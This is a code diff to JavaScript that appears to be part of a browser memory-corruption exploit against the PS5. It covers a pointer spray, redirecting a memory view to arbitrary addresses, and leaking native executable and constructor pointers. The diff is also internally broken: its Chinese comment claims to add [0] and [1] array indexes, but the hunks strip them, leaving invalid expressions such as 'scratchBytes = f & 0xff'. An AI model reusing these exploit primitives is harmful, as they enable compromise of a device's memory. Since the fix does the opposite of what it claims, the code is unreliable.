@@ -98,6 +98,7 @@ function sameBytes(l, r, c) {
   return true; 
 }
 
+// === 核心修正點：為 scratchWords 補齊強硬的 [0] 與 [1] 陣列索引下標，根除左式賦值異常 ===
 function redirectView(c, a) { 
   const h = Math_floor(a / 0x100000000); 
   scratchWords[0] = a - h * 0x100000000; 
@@ -136,10 +137,10 @@ function inspectViewHeader() {
 }
 
 function makeUpgradedHeader() { 
-  for (let i = 0; i < 8; i++) scratchBytes[i] = viewHeader[i]; 
-const f = scratchBytes[0] + scratchBytes[1] * 0x100 - 2;
-scratchBytes[0] = f & 0xff;
-scratchBytes[1] = (f >> 8) & 0xff;
+for (let i = 0; i < 8; i++) scratchBytes[i] = viewHeader[i];
+const f = scratchBytes + scratchBytes * 0x100 - 2;
+scratchBytes = f & 0xff;
+scratchBytes = (f >> 8) & 0xff;
 const v = scratchDouble[0];
 return Math_isFinite(v) ? v : null;
 }
@@ -160,7 +161,7 @@ redirectView(c, a);
 readBytes(targetHeader, memoryView, 0x20);
 const ex = low48At(targetHeader, 0x18);
 if (!validStructure(targetHeader) || !plausibleAddress(low48At(targetHeader, 0x08)) || !plausibleAddress(low48At(targetHeader, 0x10)) || !plausibleCell(ex)) return null;
-return { executable: ex, type: targetHeader[5] };
+return { executable: ex, type: targetHeader[0] };
 }
 function inspectNativeExecutable(c, a) {
 redirectView(c, a);
@@ -168,7 +169,7 @@ readBytes(targetHeader, memoryView, NATIVE_EXECUTABLE_BYTES);
 const nf = low48At(targetHeader, 0x28);
 const nc = low48At(targetHeader, 0x30);
 if (!validStructure(targetHeader) || !canonicalLow48(targetHeader, 0x28) || !canonicalLow48(targetHeader, 0x30) || !plausibleAddress(nf) || !plausibleAddress(nc) || nf === nc) return null;
-return { nativeFunction: nf, nativeConstructor: nc, type: targetHeader[5] };
+return { nativeFunction: nf, nativeConstructor: nc, type: targetHeader[0] };
 }
 function rejectRedirected(c, r) {
 restoreView(c);
@@ -185,7 +186,7 @@ if (clone.length !== 0x50001) {
 clone[DUPLICATE_INDEX] = undefined;
 return invalidClone("Unexpected length", true);
 }
-if (clone[1] === clone[DUPLICATE_INDEX]) {
+if (clone === clone[DUPLICATE_INDEX]) {
 clone[DUPLICATE_INDEX] = undefined;
 clearPointerSpray();
 return { status: "unchanged", safe: true };
@@ -217,9 +218,9 @@ const ni = inspectNativeExecutable(candidate, fi.executable);
 if (ni === null) return rejectRedirected(candidate, "Invalid executable");
 globalThis.__ps5NativeCtor = ni.nativeConstructor;
 redirectView(candidate, nta);
-const fm = low48At(memoryView, 0x18) === fi.executable && memoryView[5] === fi.type;
+const fm = low48At(memoryView, 0x18) === fi.executable && memoryView[0] === fi.type;
 redirectView(candidate, fi.executable);
-const nm = low48At(memoryView, 0x28) === ni.nativeFunction && low48At(memoryView, 0x30) === ni.nativeConstructor && memoryView[5] === ni.type;
+const nm = low48At(memoryView, 0x28) === ni.nativeFunction && low48At(memoryView, 0x30) === ni.nativeConstructor && memoryView[0] === ni.type;
 restoreView(candidate);
 vr = false;
 if (!fm || !nm || memoryView[0] !== 0x3c || memoryMirror[0] !== 0x3c || targetView[0] !== 0xa5) {
